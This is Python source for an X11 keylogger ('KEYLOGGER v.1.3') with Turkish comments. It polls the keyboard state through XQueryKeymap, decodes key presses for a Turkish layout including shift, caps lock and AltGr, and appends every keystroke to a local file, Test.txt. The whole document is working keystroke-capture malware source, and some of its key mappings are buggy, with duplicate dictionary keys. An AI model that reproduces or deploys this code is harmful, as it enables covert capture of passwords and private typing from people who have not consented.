#######################################################
#                                                     #
#                                                     #
#                KEYLOGGER v.1.3                      #
#                                                     #
#                                                     #
#######################################################

# Eksikleri : F11, sag CTRL ve ENTER  tuslari tanitilamadi.
# ---------------------------------------------------------------------#

#________________ Duzeltilenler ________________#
# sag ALT GR tusu ile ucuncul secim yapiliyor.

###########################################
# Turkce karakter sorununu cozmek icin    #
# unicodelardan faydalandim. Fakat python #
# aciklama satirinda bile Turkce karakter #
# kullanmama izin vermedigi icin          #
# asagidaki gibi yazmak zorunda kaldim    #
#                                         #
#       Sapkali g           - \u011f      #
#       Sapkali Buyuk g     - \u011e      #
#       kucuk I             - \u0131      #
#       buyuk Noktali I     - \u0130      #
#       kucuk Noktali o     - \u00f6      #
#       buyuk Noktali O     - \u00d6      #
#       kcuk Noktali u      - \u00fc      #
#       buyuk Noktali U     - \u00dc      #
#       Kucuk Noktali s     - \u015f      #
#       buyuk Noktali S     - \u015e      #
#       kucuk Noktali c     - \u00e7      #
#       buyuk Noktali C     - \u00c7      #
#                                         #
###########################################

from time import sleep, time
import ctypes as ct
from ctypes.util import find_library

tuslar = {
    1: {
        0b00000010: "<esc>",
        0b00000100: ("1", "!", ">"),
        0b00001000: ("2", "'", "2"),
        0b00010000: ("3", "^", "#"),
        0b00100000: ("4", "+", "$"),
        0b01000000: ("5", "%", "5"),
        0b10000000: ("6", "&", "6"),
    },
    2: {
        0b00000001: ("7", "/", "{"),
        0b00000010: ("8", "(", "["),
        0b00000100: ("9", ")", "]"),
        0b00001000: ("0", "=", "}"),
        0b00010000: ("*", "?", "\\"),
        0b00100000: ("-", "_", "|"),
        0b01000000: "<backspace>",
        0b10000000: "<tab>",
    },
    3: {
        0b00000001: ("q", "Q", "@"),
        0b00000010: ("w", "W", "W"),
        0b00000100: ("e", "E", "E"),
        0b00001000: ("r", "R", "R"),
        0b00010000: ("t", "T", "T"),
        0b00100000: ("y", "Y", "Y"),
        0b01000000: ("u", "U", "U"),
        0b10000000: ("\u0131", "I", "I"),
    },
    4: {
        0b00000001: ("o", "O", "O"),
        0b00000010: ("p", "P", "P"),
        0b00000100: ("\u011f", "\u011e", "\u011e"),
        0b00001000: ("\u00fc", "\u00dc", "~"),
        0b00010000: "<enter>",
        0b00100000: "<left ctrl>",
        0b01000000: ("a", "A", "A"),
        0b10000000: ("s", "S", "S"),
    },
    5: {
        0b00000001: ("d", "D", "D"),
        0b00000010: ("f", "F", "F"),
        0b00000100: ("g", "G", "G"),
        0b00001000: ("h", "H", "H"),
        0b00010000: ("j", "J", "J"),
        0b00100000: ("k", "K", "K"),
        0b01000000: ("l", "L", "L"),
        0b10000000: ("\u015f", "\u015e", "\u015e"),
    },
    6: {
        0b00000001: ("i", "\u0130", "\u0130"),
        0b00000010: "\"",
        0b00000100: "<left shift>",
        0b00001000: (",", ";", "`"),
        0b00010000: ("z", "Z", "Z"),
        0b00100000: ("x", "X", "X"),
        0b01000000: ("c", "C", "C"),
        0b10000000: ("v", "V", "V"),
    },
    7: {
        0b00000001: ("b", "B", "B"),
        0b00000010: ("n", "N", "N"),
        0b00000100: ("m", "M", "M"),
        0b00001000: ("\u00f6", "\u00d6", "\u00d6"),
        0b00010000: ("\u00e7", "\u00c7", "\u00c7"),
        0b00100000: (".", ":", ":"),
        0b01000000: "<right shift>",

        0b10000000: "*",
    },
    8: {
        0b00000001: "<left alt>",
        0b00000010: " ",
        0b00000100: "<caps lock>",

        0b00001000: "F1",
        0b00010000: "F2",
        0b00100000: "F3",
        0b01000000: "F4",
        0b10000000: "F5",

    },
    9: {
        0b00000001: "F6",
        0b00000010: "F7",
        0b00000100: "F8",
        0b00001000: "F9",
        0b00010000: "F10",
        0b00100000: "<Num Lock>",
        0b10000000: "7",
    },
    10: {
        0b00000001: "8",
        0b00000010: "9",
        0b00000100: "-",
        0b00001000: "4",
        0b00010000: "5",
        0b00100000: "6",
        0b01000000: "+",
        0b10000000: "1",
    },
    11: {
        0b00000001: "2",
        0b00000010: "3",
        0b00000100: "0",
        0b00001000: ",",
        0b01000000: ("<", ">", "|"),
    },
    12: {
        0b00000001: "F12",
    },
    13: {
        0b00000100: "/",
        0b01000000: "<Home>",
        0b00000100: "<right ctrl>",
        0b00010000: "<right alt>",
        0b10000000: ("<up>", "shift-up"),
    },
    14: {
        0b00000001: ("<pageup>", "pageup"),
        0b00000010: ("<left>", "left"),
        0b00000100: ("<right>", "right"),
        0b00001000: ("<end>", "end"),
        0b00010000: ("<down>", "down"),
        0b00100000: ("<pagedown>", "PgDn"),
        0b01000000: ("<insert>", "insert"),
        0b10000000: "<DEL>",
    },
}

shift_tusu = ((6,4), (7,64))
alt_gr_tusu = ((13,16), (13, 16))

x11 = ct.cdll.LoadLibrary(find_library("X11"))
ekran = x11.XOpenDisplay(None)

klavye = (ct.c_char * 32)()

son_tiklama = set()
son_tiklama_degisiklik = set()
caps_lock_durumu = 0

def tuslari_oku():

    x11.XQueryKeymap(ekran, klavye)
    return klavye

def tuslari_getir():

    global caps_lock_durumu, son_tiklama, son_tiklama_degisiklik
    tiklanma = tuslari_oku()

    alt = 0
    for j, byte in alt_gr_tusu:
        if ord(tiklanma[j]) & byte:
            alt = 2
            break

    shift = 0
    for i, byte in shift_tusu:
        if ord(tiklanma[i]) & byte:
            shift = 1
            break

    if ord(tiklanma[8]) & 4: caps_lock_durumu = int(not caps_lock_durumu)

    tiklandi = []
    for i, k in enumerate(tiklanma):
        o = ord(k)
        if o:
            for byte,tus in tuslar.get(i, {}).iteritems():
                if byte & o:
                    if isinstance(tus, tuple): tus = tus[shift or caps_lock_durumu or alt]
                    tiklandi.append(tus)

    tmp = tiklandi
    basildi = list(set(tiklandi).difference(son_tiklama))
    durum_degisti = tmp != son_tiklama and (basildi or son_tiklama_degisiklik)
    son_tiklama = tmp
    son_tiklama_degisiklik = basildi

    if basildi: basildi = basildi[0]
    else: basildi = None
    return durum_degisti, basildi

def log(git, geri_cagir, aralik=.00000005):
    while not git():
        sleep(aralik)
        degisim, tuslar = tuslari_getir()
        if degisim: geri_cagir(time(), tuslar)

if __name__ == "__main__":
    simdi = time()
    git = lambda: time() > simdi + 1000000
    def yazdir(t, tuslar):
        with open("Test.txt", "a") as dosya:
            dosya.write(tuslar)
        print("%.2f   %r" % (t, tuslar))

    log(git, yazdir)
